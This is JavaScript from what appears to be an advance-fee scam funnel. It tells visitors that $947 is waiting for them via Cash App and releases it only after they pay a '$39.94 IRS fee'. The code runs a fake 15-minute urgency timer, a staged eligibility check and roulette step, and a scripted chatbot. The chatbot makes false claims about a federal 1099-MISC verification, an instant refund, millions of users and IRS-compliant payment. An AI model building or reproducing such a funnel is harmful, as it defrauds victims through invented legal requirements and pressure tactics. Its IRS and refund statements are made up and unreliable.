<script>
  // ============ LOAD WITHDRAWAL DATA FROM OF2 ============
  let withdrawal = null;
  try{
    const raw = localStorage.getItem('withdrawal_data');
    if(raw) withdrawal = JSON.parse(raw);
  } catch(e){}

  // Defaults if no data
  if(!withdrawal){
    withdrawal = {
      name: 'Account Holder',
      method: 'Cash App',
      methodKey: 'cashapp',
      amount: 947,
      amountFormatted: '$947.00',
      account: '$account',
      date: new Date().toISOString()
    };
  }

  // ============ POPULATE SUMMARY ============
  function capitalize(s){
    if(!s) return '';
    return s.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
  }
  function formatDate(iso){
    const d = new Date(iso);
    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear();
  }
  function generateRef(){
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let s = 'TT-';
    for(let i = 0; i < 4; i++){
      s += chars[Math.floor(Math.random() * chars.length)];
    }
    s += '-';
    for(let i = 0; i < 4; i++){
      s += chars[Math.floor(Math.random() * chars.length)];
    }
    return s;
  }

  document.getElementById('sumName').textContent = capitalize(withdrawal.name) || 'Account Holder';
  document.getElementById('sumMethod').textContent = withdrawal.method;
  document.getElementById('sumAccount').textContent = withdrawal.account || '—';
  document.getElementById('sumDate').textContent = formatDate(withdrawal.date);
  document.getElementById('sumAmount').textContent = withdrawal.amountFormatted;
  document.getElementById('balanceAmount').textContent = parseFloat(withdrawal.amount).toFixed(2);
  document.getElementById('totalAmountInline').textContent = withdrawal.amountFormatted;

  // IRS fee — fixed $39.94 regardless of withdrawal amount
  const irsFee = 39.94;
  document.getElementById('irsFeeAmount').textContent = irsFee.toFixed(2);

  // ============ URGENCY TIMER (15 min countdown) ============
  let totalSeconds = 14 * 60 + 59;
  const timerEl = document.getElementById('urgencyTimer');
  function tickTimer(){
    if(totalSeconds <= 0){
      timerEl.textContent = '0:00';
      return;
    }
    const m = Math.floor(totalSeconds / 60);
    const s = totalSeconds % 60;
    timerEl.textContent = m + ':' + (s < 10 ? '0' + s : s);
    totalSeconds--;
  }
  tickTimer();
  setInterval(tickTimer, 1000);

  // ============ FAQ ACCORDION ============
  document.querySelectorAll('.faq-q').forEach(q => {
    q.addEventListener('click', () => {
      q.closest('.faq-item').classList.toggle('open');
    });
  });

  // ============ CTA BUTTON ============
  const btnPay = document.getElementById('btnPay');
  const toast = document.getElementById('toast');
  const toastMsg = document.getElementById('toastMsg');

  function showToast(msg){
    toastMsg.textContent = msg;
    toast.classList.add('show');
    clearTimeout(window._t);
    window._t = setTimeout(() => toast.classList.remove('show'), 2400);
  }

  function processPayment(){
    btnPay.disabled = true;
    btnPay.innerHTML = '<span style=&quot;display:inline-flex;align-items:center;gap:8px&quot;>'
      + '<svg width=&quot;16&quot; height=&quot;16&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;3&quot; stroke-linecap=&quot;round&quot;><path d=&quot;M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83&quot; style=&quot;animation:spin 1s linear infinite;transform-origin:12px 12px&quot;/></svg>'
      + 'Redirecting to secure payment...</span>';
    showToast('Connecting to payment processor...');
  }
  btnPay.addEventListener('click', processPayment);

  // ============ CHATBOT ============
  const chatBackdrop = document.getElementById('chatBackdrop');
  const chatClose = document.getElementById('chatClose');
  const chatBody = document.getElementById('chatBody');
  const chatOptions = document.getElementById('chatOptions');
  const btnHelp = document.getElementById('btnHelp');

  const CTA_HTML = '<a class=&quot;chat-cta&quot; id=&quot;ctaInChat&quot;>Pay IRS fee &amp; receive $947 <svg viewBox=&quot;0 0 24 24&quot;><path d=&quot;M5 12h14M13 5l7 7-7 7&quot;/></svg></a>';

  const chatTree = {
    root: {
      options: [
        {id: 'why_fee', label: 'Why is there an IRS fee?'},
        {id: 'refund', label: 'Will I really get my $39.94 back?'},
        {id: 'time', label: 'How long until I receive everything?'},
        {id: 'safe', label: 'Is the payment safe?'},
        {id: 'skip', label: 'Can I skip this step?'},
        {id: 'pay_how', label: 'How do I pay the $39.94?'}
      ]
    },
    why_fee: {
      reply: '🏛 It\'s a U.S. federal requirement (<strong>1099-MISC</strong>). Earnings over $600/year need IRS verification before release. The <strong>$39.94</strong> is fully refundable within 1 minute.',
      cta: true,
      followup: 'Anything else?'
    },
    refund: {
      reply: '💯 Yes! The <strong>$39.94 is automatically refunded</strong> within 1 minute of payment, together with your full <strong>$947.00</strong>. We\'re legally required to verify, not to keep your money.',
      cta: true,
      followup: 'Any other doubts?'
    },
    time: {
      reply: '⚡ Super fast: <strong>1 min</strong> for the refund + <strong>3 min</strong> for your $947.00 to land in your account. Total: under 5 minutes from payment.',
      cta: true,
      followup: 'Want to start now?'
    },
    safe: {
      reply: '🔒 100%. <strong>256-bit SSL</strong> + IRS-compliant processor. Over 2.4M users completed this same verification safely. Your $947 is waiting on the other side.',
      cta: true,
      followup: 'Ready to proceed?'
    },
    skip: {
      reply: '❌ Unfortunately no. The IRS verification is mandatory under federal law for any rewards over $600. <strong>Without it, your $947.00 stays locked.</strong> But remember — the $39.94 comes right back to you 💸',
      cta: true,
      followup: 'Anything else?'
    },
    pay_how: {
      reply: '💳 Just click the red button below. You\'ll be redirected to a <strong>secure payment page</strong> (credit card, Apple Pay, etc.). Takes 30 seconds. Your $947.00 releases right after.',
      cta: true,
      followup: 'Need anything else?'
    }
  };

  function renderChatOptions(){
    chatOptions.innerHTML = '<div class=&quot;chat-options-label&quot;>Quick questions</div>';
    chatTree.root.options.forEach(opt => {
      const btn = document.createElement('button');
      btn.className = 'chat-opt-btn';
      btn.innerHTML = opt.label + ' <span class=&quot;arr&quot;>›</span>';
      btn.onclick = () => handleChatOption(opt);
      chatOptions.appendChild(btn);
    });
  }

  function addChatMsg(text, who){
    const msg = document.createElement('div');
    msg.className = 'chat-msg ' + who;
    msg.innerHTML = text;
    chatBody.appendChild(msg);
    requestAnimationFrame(() => {
      chatBody.scrollTo({top: chatBody.scrollHeight, behavior: 'smooth'});
    });
    return msg;
  }

  function showChatTyping(){
    removeChatTyping();
    const t = document.createElement('div');
    t.className = 'chat-typing show';
    t.id = 'chatTypingIndicator';
    t.innerHTML = '<span></span><span></span><span></span>';
    chatBody.appendChild(t);
    requestAnimationFrame(() => {
      chatBody.scrollTo({top: chatBody.scrollHeight, behavior: 'smooth'});
    });
  }
  function removeChatTyping(){
    const t = document.getElementById('chatTypingIndicator');
    if(t) t.remove();
  }

  function cleanupOldCtas(){
    document.querySelectorAll('.chat-cta').forEach(el => {
      el.removeAttribute('id');
      el.style.opacity = '0.5';
      el.style.pointerEvents = 'none';
      el.style.animation = 'none';
    });
  }

  function handleChatOption(opt){
    addChatMsg(opt.label, 'user');
    chatOptions.innerHTML = '';
    cleanupOldCtas();

    setTimeout(() => {
      showChatTyping();
      setTimeout(() => {
        removeChatTyping();
        const node = chatTree[opt.id];
        let replyHtml = node.reply;
        if(node.cta) replyHtml += '<br><br>' + CTA_HTML;
        const botMsg = addChatMsg(replyHtml, 'bot');

        const ctaEl = botMsg.querySelector('#ctaInChat');
        if(ctaEl){
          ctaEl.addEventListener('click', e => {
            e.preventDefault();
            chatBackdrop.classList.remove('open');
            // Trigger the pay button click after the chat closes
            setTimeout(() => {
              const payTarget = document.getElementById('btnPay');
              if(payTarget){
                payTarget.scrollIntoView({behavior:'smooth', block:'center'});
                setTimeout(() => payTarget.click(), 400);
              }
            }, 200);
          });
        }

        requestAnimationFrame(() => {
          botMsg.scrollIntoView({behavior:'smooth', block:'end'});
        });

        if(node.followup){
          setTimeout(() => {
            addChatMsg(node.followup, 'bot');
            renderChatOptions();
            requestAnimationFrame(() => {
              chatBody.scrollTo({top: chatBody.scrollHeight, behavior: 'smooth'});
            });
          }, 1200);
        }
      }, 1400);
    }, 400);
  }

  btnHelp.addEventListener('click', () => {
    chatBackdrop.classList.add('open');
    if(!chatOptions.children.length || chatOptions.children.length === 1){
      renderChatOptions();
    }
  });
  chatClose.addEventListener('click', () => chatBackdrop.classList.remove('open'));
  chatBackdrop.addEventListener('click', e => {
    if(e.target === chatBackdrop) chatBackdrop.classList.remove('open');
  });
  document.addEventListener('keydown', e => {
    if(e.key === 'Escape' &amp;&amp; chatBackdrop.classList.contains('open')){
      chatBackdrop.classList.remove('open');
    }
  });

  renderChatOptions();
</script>

<script>
const frames = {
  presell: document.getElementById('framePresell'),
  roulette: document.getElementById('frameRoulette'),
  landing: document.getElementById('frameLanding'),
  of2: document.getElementById('frameOf2'),
  of3: document.getElementById('frameOf3')
};
const eligLoading = document.getElementById('eligLoading');
const eligProgress = document.getElementById('eligProgress');
const eligCheckingBlock = document.getElementById('eligCheckingBlock');
const eligSuccess = document.getElementById('eligSuccess');
const eligSuccessBtn = document.getElementById('eligSuccessBtn');
const eligSteps = document.querySelectorAll('.elig-step');

let withdrawalData = null;
let rouletteTotal = 0;

function showFrame(name){
  Object.keys(frames).forEach(k => frames[k].classList.toggle('active', k === name));
  try{ frames[name].contentWindow.scrollTo(0, 0); } catch(e){}
}
function delay(ms){ return new Promise(r => setTimeout(r, ms)); }

async function runEligibilitySequence(){
  eligSteps.forEach(s => s.classList.remove('active','done','visible'));
  eligCheckingBlock.style.display = '';
  eligSuccess.classList.remove('show');
  eligProgress.style.width = '0%';
  eligLoading.classList.add('show');
  Object.keys(frames).forEach(k => frames[k].classList.remove('active'));
  await delay(150);
  for(let i = 0; i < eligSteps.length; i++){
    eligSteps[i].classList.add('visible');
    await delay(100);
  }
  await delay(250);
  const durations = [1400, 1500, 1300];
  const progress = [33, 66, 100];
  for(let i = 0; i < eligSteps.length; i++){
    if(i > 0){
      eligSteps[i-1].classList.remove('active');
      eligSteps[i-1].classList.add('done');
    }
    eligSteps[i].classList.add('active');
    eligProgress.style.width = progress[i] + '%';
    await delay(durations[i]);
  }
  eligSteps[eligSteps.length-1].classList.remove('active');
  eligSteps[eligSteps.length-1].classList.add('done');
  await delay(500);
  eligCheckingBlock.style.display = 'none';
  eligSuccess.classList.add('show');
}

eligSuccessBtn.addEventListener('click', () => {
  eligLoading.classList.remove('show');
  showFrame('roulette');
});

function goToRoulette(){ showFrame('roulette'); }
function goToLanding(data){
  if(data && data.total){
    rouletteTotal = data.total;
    try{ localStorage.setItem('roulette_total', String(data.total)); } catch(e){}
  }
  window.location.href = '/withdrawl.html' + window.location.search
}
function goToOf2(){
  if(withdrawalData){
    try{ frames.of2.contentWindow.localStorage.setItem('withdrawal_data', JSON.stringify(withdrawalData)); } catch(e){}
  }
  showFrame('of2');
}
function backToLanding(){ showFrame('landing'); }
function backToOf2(){
  if(withdrawalData){
    try{
      frames.of2.contentWindow.localStorage.setItem('withdrawal_data', JSON.stringify(withdrawalData));
      frames.of2.contentWindow.location.reload();
    } catch(e){}
    setTimeout(() => showFrame('of2'), 150);
  } else {
    showFrame('of2');
  }
}
async function goToOf3(data){
  withdrawalData = data;
  Object.keys(frames).forEach(k => frames[k].classList.remove('active'));
  try{
    frames.of3.contentWindow.localStorage.setItem('withdrawal_data', JSON.stringify(data));
    frames.of3.contentWindow.location.reload();
  } catch(e){}
  setTimeout(() => showFrame('of3'), 250);
}

window.addEventListener('message', (e) => {
  if(!e.data || typeof e.data !== 'object') return;
  switch(e.data.type){
    case 'goToRoulette': goToRoulette(); break;
    case 'goToLanding': goToLanding(e.data); break;
    case 'goToOf2': goToOf2(); break;
    case 'goToOf3': goToOf3(e.data.data); break;
    case 'backToLanding': backToLanding(); break;
    case 'backToOf2': backToOf2(); break;
  }
});
</script>
